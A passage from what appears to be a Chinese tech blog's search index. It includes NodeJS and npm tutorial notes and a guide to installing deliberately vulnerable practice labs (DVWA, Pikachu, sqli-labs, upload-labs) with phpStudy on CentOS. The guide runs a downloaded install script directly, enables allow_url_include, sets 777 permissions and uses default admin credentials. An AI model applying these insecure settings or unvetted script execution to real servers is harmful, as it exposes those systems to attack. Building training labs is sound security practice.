id="Spring单元测试"><a href="#Spring单元测试" class="headerlink" title="Spring单元测试"></a>Spring单元测试</h1><h1 id="Spring-JDBC-Template"><a href="#Spring-JDBC-Template" class="headerlink" title="Spring JDBC Template"></a>Spring JDBC Template</h1>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>靶场搭建</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>本问记录日期：20240701</p><h1 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h1><p>CentOS7 + phpStudy + php7.3.22 + mysql5.7.27</p><h1 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h1><div class="code-wrapper"><pre><code class="hljs vim">yum install -<span class="hljs-keyword">y</span> wget &amp;&amp; wget -O install.<span class="hljs-keyword">sh</span> https://notdocker.xp.<span class="hljs-keyword">cn</span>/install.<span class="hljs-keyword">sh</span> &amp;&amp; <span class="hljs-keyword">sh</span> install.<span class="hljs-keyword">sh</span></code></pre></div><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><h2 id="切换网站环境"><a href="#切换网站环境" class="headerlink" title="切换网站环境"></a>切换网站环境</h2><p>切换默认网站的<code>PHP命令行版本</code>和网站的<code>程序语言</code>版本为<code>php7.x版本</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701163444614.png">  </p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701153956395.png"> </p><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><p>项目地址：<a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a></p><p>将下载的<code>DVWA-master.zip</code>文件保存至<code>/www/admin/localhost_80/wwwroot</code>目录下，解压并目录重命名为<code>dvwa</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701154533327.png"> </p><h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h2><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /www/admin/localhost_80/wwwroot/dvwa/config/<span class="hljs-built_in">cp</span> config.inc.php.dist config.inc.php</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701155517701.png"> </p><p><strong>配置数据库连接</strong></p><div class="code-wrapper"><pre><code class="hljs abnf">vim config.inc.php<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>确保数据库连接信息正确<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701154739027.png"> </p><h2 id="修改php配置"><a href="#修改php配置" class="headerlink" title="修改php配置"></a>修改php配置</h2><div class="code-wrapper"><pre><code class="hljs abnf">vim /usr/local/phpstudy/soft/php/php-<span class="hljs-number">5.5</span>.<span class="hljs-number">38</span>/etc/php.ini<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>将以下配置修改为On<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>display_errors <span class="hljs-operator">=</span> Ondisplay_startup_errors <span class="hljs-operator">=</span> Onallow_url_fopen <span class="hljs-operator">=</span> Onallow_url_include <span class="hljs-operator">=</span> On</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701160351310.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701161323351.png"> </p><h2 id="配置目录写权限"><a href="#配置目录写权限" class="headerlink" title="配置目录写权限"></a>配置目录写权限</h2><div class="code-wrapper"><pre><code class="hljs awk">chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/www/</span>admin<span class="hljs-regexp">/localhost_80/</span>wwwroot<span class="hljs-regexp">/dvwa/</span>hackable<span class="hljs-regexp">/uploads/</span>chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/www/</span>admin<span class="hljs-regexp">/localhost_80/</span>wwwroot<span class="hljs-regexp">/dvwa/</span>configll <span class="hljs-regexp">/www/</span>admin<span class="hljs-regexp">/localhost_80/</span>wwwroot<span class="hljs-regexp">/dvwa/</span>hackable<span class="hljs-regexp">/uploads/</span>ll <span class="hljs-regexp">/www/</span>admin<span class="hljs-regexp">/localhost_80/</span>wwwroot<span class="hljs-regexp">/dvwa/</span>config</code></pre></div><h2 id="重启中间件"><a href="#重启中间件" class="headerlink" title="重启中间件"></a>重启中间件</h2><p>重启实际使用的中间件，如apache，nginx</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701160542719.png"> </p><h2 id="安装检查"><a href="#安装检查" class="headerlink" title="安装检查"></a>安装检查</h2><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p<span class="hljs-regexp">/dvwa/</span>setup.php</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701162250381.png"> </p><p>确保所有项状态都是绿色即可。图中<code>reCAPTCHA key: Missing</code>可忽略，也可参考<a href="https://blog.csdn.net/WZZ_2363173126/article/details/120707038%E8%A7%A3%E5%86%B3%E3%80%82">https://blog.csdn.net/WZZ_2363173126/article/details/120707038解决。</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装检查没问题后，点击下方的<code>Create/Reset Database</code>按钮导入数据库文件，出现图示结果即安装成功。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701162923050.png"></p><p>登录地址</p><div class="code-wrapper"><pre><code class="hljs pgsql">http://ip/dvwa/<span class="hljs-keyword">login</span>.php<span class="hljs-keyword">admin</span> / <span class="hljs-keyword">password</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701162621946.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701162713511.png"> </p><h1 id="Pikachu"><a href="#Pikachu" class="headerlink" title="Pikachu"></a>Pikachu</h1><h2 id="创建数据库-1"><a href="#创建数据库-1" class="headerlink" title="创建数据库"></a>创建数据库</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701163853923.png"> </p><h2 id="下载项目-1"><a href="#下载项目-1" class="headerlink" title="下载项目"></a>下载项目</h2><p>项目地址：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p><p>将下载的<code>pikachu-master.zip</code>文件保存至<code>/www/admin/localhost_80/wwwroot</code>目录下，解压并目录重命名为<code>pikachu</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701164139116.png"> </p><h2 id="配置数据库连接"><a href="#配置数据库连接" class="headerlink" title="配置数据库连接"></a>配置数据库连接</h2><div class="code-wrapper"><pre><code class="hljs abnf">vim www/admin/localhost_80/wwwroot/pikachu/inc/config.inc.php<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>确保数据库连接信息正确<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span></code></pre></div><h2 id="初始化安装"><a href="#初始化安装" class="headerlink" title="初始化安装"></a>初始化安装</h2><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p<span class="hljs-regexp">/pikachu/i</span>nstall.php</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701164442778.png"></p><p>点击<code>安装/初始化</code>按钮进行安装，出现图示结果即安装成功</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701164535508.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701164633709.png"> </p><h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><h2 id="创建数据库-2"><a href="#创建数据库-2" class="headerlink" title="创建数据库"></a>创建数据库</h2><p> 无需另外创建数据库，后续会自动创建</p><h2 id="下载项目-2"><a href="#下载项目-2" class="headerlink" title="下载项目"></a>下载项目</h2><p>项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>将下载的<code>sqli-labs-master.zip</code>文件保存至<code>/www/admin/localhost_80/wwwroot</code>目录下，解压并目录重命名为<code>sqli</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701165542487.png"> </p><h2 id="配置数据库连接-1"><a href="#配置数据库连接-1" class="headerlink" title="配置数据库连接"></a>配置数据库连接</h2><div class="code-wrapper"><pre><code class="hljs abnf">vim /www/admin/localhost_80/wwwroot/sqli/sql-connections/db-creds.inc<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>确保数据库连接信息正确，只需配置root用户密码即可<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span></code></pre></div><p> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701170933110.png"> </p><h2 id="切换网站环境-1"><a href="#切换网站环境-1" class="headerlink" title="切换网站环境"></a>切换网站环境</h2><p>sqlilab某些函数不支持php7.x版本，需安装php5.x版本。切换默认网站的<code>PHP命令行版本</code>和网站的<code>程序语言</code>版本为<code>php5.x版本</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701165953616.png"></p><h2 id="重启中间件-1"><a href="#重启中间件-1" class="headerlink" title="重启中间件"></a>重启中间件</h2><p>略</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//ip/sqli</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701170146123.png"></p><p>点击<code>Setup/reset Database for labs</code> 进行导入数据库文件，出现图示界面即安装成功</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701170430929.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701171045047.png"> </p><h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><h2 id="下载项目-3"><a href="#下载项目-3" class="headerlink" title="下载项目"></a>下载项目</h2><p>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>将下载的<code>upload-labs-master.zip</code>文件保存至<code>/www/admin/localhost_80/wwwroot</code>目录下，解压并目录重命名为<code>sqli</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240701171322254.png"> </p><h2 id="访问-1"><a href="#访问-1" class="headerlink" title="访问"></a>访问</h2><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//ip/upload</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NodeJS问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/NodeJS/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/NodeJS/</url>
    
    <content type="html"><![CDATA[<h1 id="SyntaxError-Cannot-use-import-statement-outside-a-module"><a href="#SyntaxError-Cannot-use-import-statement-outside-a-module" class="headerlink" title="SyntaxError: Cannot use import statement outside a module"></a>SyntaxError: Cannot use import statement outside a module</h1><p>webstorm默认使用commonJS模块规范，使用import导入模块需要在<code>package.json</code>文件中加入<code>&quot;type&quot;: &quot;module&quot;</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240627142103132.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240627142306744.png"> </p>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NodeJS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NodeJS</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/NodeJS/NodeJS/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/NodeJS/NodeJS/</url>
    
    <content type="html"><![CDATA[<h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p>Node.js是一个开源的跨平台JavaScript运行时环境。可以在浏览器之外运行V8 JavaScript引擎。</p><p><strong>可以做什么</strong></p><p>开发服务器应用</p><p>开发工具类应用：如Webpack</p><p>开发桌面端应用：如VSCode、Figma、Postman&lt;–electron&lt;–nodejs</p><h2 id="JavaScript-V8引擎"><a href="#JavaScript-V8引擎" class="headerlink" title="JavaScript V8引擎"></a>JavaScript V8引擎</h2><p>V8是谷歌的开源高性能JavaScript和WebAssembly引擎，用C++编写。它被用于Chrome和Node.js等。它实现ECMAScript和WebAssembly，并在使用x64、IA-32或ARM处理器的Windows、macOS和Linux系统上运行。V8可以嵌入到任何C++应用程序中。</p><h2 id="NodeJs与浏览器的区别"><a href="#NodeJs与浏览器的区别" class="headerlink" title="NodeJs与浏览器的区别"></a>NodeJs与浏览器的区别</h2><p>在NodeJs中无法使用<code>DOM</code>和<code>BOM</code>的API。如无法使用<code>document</code>、<code>window</code>、<code>navigator</code>对象等</p><p>在浏览器中无法使用NodeJs特性的模块API，例如文件系统访问功能</p><p>Node.js同时支持CommonJS和ES模块系统（自Node.js v12以来），而在浏览器中，我们开始看到ES模块标准正在实现。</p><p>可以在Node.js中同时使用<code>require()</code>和<code>import</code>，而只能在浏览器中使用<code>import</code>。</p><h2 id="安装NodeJs"><a href="#安装NodeJs" class="headerlink" title="安装NodeJs"></a>安装NodeJs</h2><p><strong>安装方式</strong></p><ul><li>通过Nvm版本管理器安装</li><li>通过安装程序安装</li><li>通过二进制文件安装(tar.gz或zip包)</li><li>源码编译安装</li></ul><h1 id="管理器"><a href="#管理器" class="headerlink" title="管理器"></a>管理器</h1><h2 id="Nvm版本管理"><a href="#Nvm版本管理" class="headerlink" title="Nvm版本管理"></a>Nvm版本管理</h2><p><code>nvm</code>是运行 Node.js 的一种流行方式。它允许您轻松切换 Node.js 版本，并安装新版本以尝试并在出现问题时轻松回滚。</p><h2 id="Nrm源管理"><a href="#Nrm源管理" class="headerlink" title="Nrm源管理"></a>Nrm源管理</h2><p><strong>配置包下载源</strong></p><ul><li>通过命令行配置</li></ul><div class="code-wrapper"><pre><code class="hljs arduino">npm config set registry https:<span class="hljs-comment">//registry.npmirror.com/     //配置淘宝镜像源</span></code></pre></div><ul><li>通过nrm配置</li></ul><div class="code-wrapper"><pre><code class="hljs stylus">npm config list  <span class="hljs-comment">//查看registry配置</span>npm install -<span class="hljs-selector-tag">g</span> nrmnrm <span class="hljs-selector-tag">use</span> taobao     <span class="hljs-comment">//配置淘宝镜像源</span></code></pre></div><h2 id="Npm包管理"><a href="#Npm包管理" class="headerlink" title="Npm包管理"></a>Npm包管理</h2><p><code>npm</code>是 Node.js 的标准包管理器。其他还有<code>yarn</code>包管理器</p><p><strong>package.json</strong></p><div class="code-wrapper"><pre><code class="hljs ceylon">name：包名称version：版本description：包描述main：入口文件scripts：脚本命令author：作者<span class="hljs-meta">license</span>：授权dependencies：生产依赖     <span class="hljs-comment">//开发阶段和上线运行阶段都使用</span>devDependencies：开发依赖  <span class="hljs-comment">//仅在开发阶段使用</span>repository：仓库keywords：关键字homepage：主页type：指定模块规范，可选值有：commonjs和<span class="hljs-keyword">module</span></code></pre></div><p><strong>初始化包</strong></p><p>即创建<code>package.json</code>文件</p><div class="code-wrapper"><pre><code class="hljs csharp">npm <span class="hljs-keyword">init</span>npm <span class="hljs-keyword">init</span> -y <span class="hljs-comment">//快速创建配置文件</span></code></pre></div><p><strong>安装所有依赖</strong></p><div class="code-wrapper"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span></code></pre></div><p>如果项目有<code>paceage.json</code>文件，可运行<code>npm install</code>命令下载所有项目依赖包保存在<code>node_modules</code>文件夹中</p><p><strong>查看包列表</strong></p><div class="code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> list     <span class="hljs-comment">#查看项目范围的包</span><span class="hljs-built_in">npm</span> list -g  <span class="hljs-comment">#查看全局范围的包</span></code></pre></div><p><strong>安装单个包</strong></p><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-comment">//局部包安装--只能在当前文件夹下使用</span>npm install &lt;<span class="hljs-keyword">package</span>-name&gt;npm install -S &lt;<span class="hljs-keyword">package</span>-name&gt;   <span class="hljs-comment">//安装生产依赖</span>npm install -D &lt;<span class="hljs-keyword">package</span>-name&gt;   <span class="hljs-comment">//安装开发依赖</span><span class="hljs-comment">//全局安装</span>npm install -g &lt;<span class="hljs-keyword">package</span>-name&gt;npm root -g   <span class="hljs-comment">//查看全局模块的文件夹路径</span></code></pre></div><p>npm5之后的版本，执行该命令会自动将该包名追加保存到<code>package.json</code>文件中。npm5之前版本需要手动加<code>--save</code>参数追加保存</p><p><strong>卸载单个包</strong></p><div class="code-wrapper"><pre><code class="hljs actionscript">npm uninstall &lt;<span class="hljs-keyword">package</span>-name&gt;npm uninstall -g &lt;<span class="hljs-keyword">package</span>-name&gt;   <span class="hljs-comment">//全局卸载包</span></code></pre></div><p><strong>更新软件包</strong></p><div class="code-wrapper"><pre><code class="hljs q">npm <span class="hljs-keyword">update</span>    <span class="hljs-comment">//更新所有软件包</span>npm <span class="hljs-keyword">update</span> &lt;package-name&gt;   <span class="hljs-comment">//更新单个包</span></code></pre></div><p><strong>版本控制</strong></p><div class="code-wrapper"><pre><code class="hljs xml">npm install <span class="hljs-tag">&lt;<span class="hljs-name">package-name</span>&gt;</span>@<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span></code></pre></div><p>安装指定版本软件包（主要用于一个库仅与另一个库的主要版本兼容）</p><p><strong>运行别名任务</strong></p><p>在<code>package.json</code>文件中的<code>scripts</code>节点中支持定义别名任务，通常用于容易忘记或输错的长命令。</p><p>例如</p><div class="code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">&#123;</span>  <span class="hljs-comment">&quot;scripts&quot;: &#123;</span>    <span class="hljs-comment">&quot;watch&quot;: &quot;webpack</span> <span class="hljs-literal">--</span><span class="hljs-comment">watch</span> <span class="hljs-literal">--</span><span class="hljs-comment">progress</span> <span class="hljs-literal">--</span><span class="hljs-comment">colors</span> <span class="hljs-literal">--</span><span class="hljs-comment">config webpack</span><span class="hljs-string">.</span><span class="hljs-comment">conf</span><span class="hljs-string">.</span><span class="hljs-comment">js&quot;</span><span class="hljs-string">,</span>    <span class="hljs-comment">&quot;dev&quot;: &quot;webpack</span> <span class="hljs-literal">--</span><span class="hljs-comment">progress</span> <span class="hljs-literal">--</span><span class="hljs-comment">colors</span> <span class="hljs-literal">--</span><span class="hljs-comment">config webpack</span><span class="hljs-string">.</span><span class="hljs-comment">conf</span><span class="hljs-string">.</span><span class="hljs-comment">js&quot;</span><span class="hljs-string">,</span>    <span class="hljs-comment">&quot;prod&quot;: &quot;NODE_ENV=production webpack</span> <span class="hljs-literal">-</span><span class="hljs-comment">p</span> <span class="hljs-literal">--</span><span class="hljs-comment">config webpack</span><span class="hljs-string">.</span><span class="hljs-comment">conf</span><span class="hljs-string">.</span><span class="hljs-comment">js&quot;</span>  <span class="hljs-comment">&#125;</span><span class="hljs-comment">&#125;</span></code></pre></div><p>运行<code>npm run &lt;task-name&gt;</code>运行别名任务。</p><div class="code-wrapper"><pre><code class="hljs routeros">$ npm <span class="hljs-built_in">run</span> watch$ npm <span class="hljs-built_in">run</span> dev$ npm <span class="hljs-built_in">run</span> prod</code></pre></div><h1 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h1><p>在命令行中运行js脚本</p><div class="code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">app</span>.js</code></pre></div><h1 id="模块规范"><a href="#模块规范" class="headerlink" title="模块规范"></a>模块规范</h1><h2 id="CJS"><a href="#CJS" class="headerlink" title="CJS"></a>CJS</h2><p>全称CommonJS，是一种服务器端模块的规范，被广泛地用于Node.js。</p><p>主要的特性如下：</p><ul><li>使用<code>require</code>函数来导入模块</li><li>使用<code>module.exports</code>或<code>exports</code>来导出模块</li><li>模块加载是同步的，即阻塞式的</li><li>主要适用于Node.js环境</li></ul><p>代码示例</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mathmodule&#x27;</span>);</code></pre></div><h2 id="ESM"><a href="#ESM" class="headerlink" title="ESM"></a>ESM</h2><p>全称ECMAScript Modules，是一种新的JavaScript模块系统，遵循ES6标准，它的主要特性如下：</p><ul><li>使用<code>import</code>语句来导入模块</li><li>使用<code>export</code>语句来导出模块</li><li>模块加载是异步的，即非阻塞式的</li><li>适用于现代浏览器和Node.js环境</li></ul><p>代码示例</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; add &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./mathmodule.js&#x27;</span>;</code></pre></div><h1 id="Buffer类"><a href="#Buffer类" class="headerlink" title="Buffer类"></a>Buffer类</h1><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-built_in">Buffer</span>.alloc(num);   <span class="hljs-comment">//创建一段归零字节序列缓冲区</span><span class="hljs-built_in">Buffer</span>.allocUnsafe(num);   <span class="hljs-comment">//创建一段可能不包含归零字节序列缓冲区</span><span class="hljs-built_in">Buffer</span>.from(<span class="hljs-string">&#x27;hello&#x27;</span>);</code></pre></div><p><strong>Buffer创建</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">let buf = <span class="hljs-built_in">Buffer</span>.alloc(<span class="hljs-number">10</span>);<span class="hljs-comment">// console.log(buf);</span>let buf_2 = <span class="hljs-built_in">Buffer</span>.allocUnsafe(<span class="hljs-number">1000</span>);<span class="hljs-comment">// console.log(buf_2)</span>let buf_3 = <span class="hljs-built_in">Buffer</span>.from(<span class="hljs-string">&#x27;hello&#x27;</span>);<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf_3);<span class="hljs-comment">//buffer 与 字符串的转换</span>let buf_4 = <span class="hljs-built_in">Buffer</span>.from([<span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>]);<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf_4.toString())<span class="hljs-comment">// buffer元素的读取</span>let buf = <span class="hljs-built_in">Buffer</span>.from(<span class="hljs-string">&#x27;hello&#x27;</span>);<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf[<span class="hljs-number">0</span>]);<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf[<span class="hljs-number">0</span>].toString(<span class="hljs-number">2</span>));<span class="hljs-comment">// 元素的修改</span>buf[<span class="hljs-number">0</span>] = <span class="hljs-number">95</span>;<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf);<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf.toString());<span class="hljs-comment">// 溢出</span>let buf2 = <span class="hljs-built_in">Buffer</span>.from(<span class="hljs-string">&#x27;hello&#x27;</span>);buf2[<span class="hljs-number">0</span>] = <span class="hljs-number">361</span>;   <span class="hljs-comment">//当发生溢出事，Node会舍弃高位的数字</span><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf2)<span class="hljs-comment">// 中文</span>let buf3 = <span class="hljs-built_in">Buffer</span>.from(<span class="hljs-string">&#x27;你好&#x27;</span>);  <span class="hljs-comment">// 每个UTF8的中文字符占用3个字节</span><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(buf3);</code></pre></div><h1 id="模块操作"><a href="#模块操作" class="headerlink" title="模块操作"></a>模块操作</h1><h2 id="创建自定义模块"><a href="#创建自定义模块" class="headerlink" title="创建自定义模块"></a>创建自定义模块</h2><p>my-module.js</p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dance</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;I can dance.&quot;</span>);&#125;module.exports=dance;</code></pre></div><p>test.js</p><div class="code-wrapper"><pre><code class="hljs abnf">const dance <span class="hljs-operator">=</span> require(<span class="hljs-string">&quot;./my-module.js&quot;</span>)<span class="hljs-comment">;</span>dance()<span class="hljs-comment">;</span></code></pre></div><h2 id="模块暴露数据"><a href="#模块暴露数据" class="headerlink" title="模块暴露数据"></a>模块暴露数据</h2><p><strong>方式</strong></p><ul><li>module.exports &#x3D; value;</li><li>exports.name &#x3D; value;</li></ul><p>示例</p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dance</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;I can dance.&quot;</span>);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;I can sing.&quot;</span>);&#125;<span class="hljs-comment">// 方式一</span><span class="hljs-comment">// module.exports = &#123;</span><span class="hljs-comment">//     dance,</span><span class="hljs-comment">//     sing</span><span class="hljs-comment">// &#125;;</span><span class="hljs-comment">// 方式二</span>exports.sing = sing;exports.dance = dance;</code></pre></div><p>两种暴露方法的方式，导入模块和使用的方式是相同的</p><p><strong>暴露方法注意事项</strong></p><div class="code-wrapper"><pre><code class="hljs elm">// 注意事项// <span class="hljs-number">1.</span> <span class="hljs-keyword">module</span>.exports 可以暴露任意数据。// <span class="hljs-keyword">module</span>.exports = &#x27;aaaaaa&#x27;;// <span class="hljs-keyword">module</span>.exports = 1111;// <span class="hljs-number">2.</span>不能使用 exports = value 的形式暴露数据// exports = &#x27;bbbbbb&#x27;// exports = module.exports = &#123;&#125;<span class="hljs-title">console</span>.log(<span class="hljs-keyword">module</span>.exports);<span class="hljs-title">console</span>.log(<span class="hljs-keyword">module</span>.exports === exports)</code></pre></div><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><h3 id="导入模块注意事项"><a href="#导入模块注意事项" class="headerlink" title="导入模块注意事项"></a>导入模块注意事项</h3><ul><li><p>自己创建的模块，导入时需要加上相对路径<code>./</code>或<code>../</code>，且不可省略</p></li><li><p>导入nodejs内置模块时，直接写模块的名称即可，无需加相对路径</p></li><li><p><code>js</code>和<code>json</code>类型文件导入时可省略后缀名。对于同名文件，Nodejs优先导入js文件</p></li><li><p>对于其他类型文件，nodejs导入均按js文件类型解析处理</p></li><li><p>如果导入的路径是文件夹，nodejs会检测该文件夹下是否存在<code>package.json</code>文件以及其中的<code>main</code>属性对应的文件是否存在，若不存在则报错。  —–如果<code>package.json</code>文件或<code>main</code>属性不存在，则会尝试导入文件夹下的<code>index.js</code>或<code>index.json</code>文件，如果也不存在则报错。</p></li></ul><h3 id="require导入自定义模块流程"><a href="#require导入自定义模块流程" class="headerlink" title="require导入自定义模块流程"></a>require导入自定义模块流程</h3><ol><li>将相对路劲转为绝对路径，定位目标文件</li><li>缓存检测</li><li>读取目标文件代码</li><li>包裹为一个函数并执行(自执行函数)。通过<code>arguments.callee.toString()</code>查看自执行函数</li><li>缓存模块的值</li><li>返回<code>module.exports</code>的值</li></ol><h3 id="require导入npm包基本流程"><a href="#require导入npm包基本流程" class="headerlink" title="require导入npm包基本流程"></a>require导入npm包基本流程</h3><ol><li>在当前文件节哀小爱node_modules中寻找同名的文件夹</li><li>在上级目录的node_modules中寻找同名的文件夹，直至找到磁盘根目录</li></ol><h1 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h1><h2 id="fs模块"><a href="#fs模块" class="headerlink" title="fs模块"></a>fs模块</h2><p>File System模块可以实现与硬盘的交互。</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a><strong>全局变量</strong></h3><p>__dirname：指定文件所在目录的绝对路径</p><p>__filename：指定文件的绝对路径</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="##相关函数"></a>##相关函数</h4><div class="code-wrapper"><pre><code class="hljs stylus">fs<span class="hljs-selector-class">.writeFile</span>()   <span 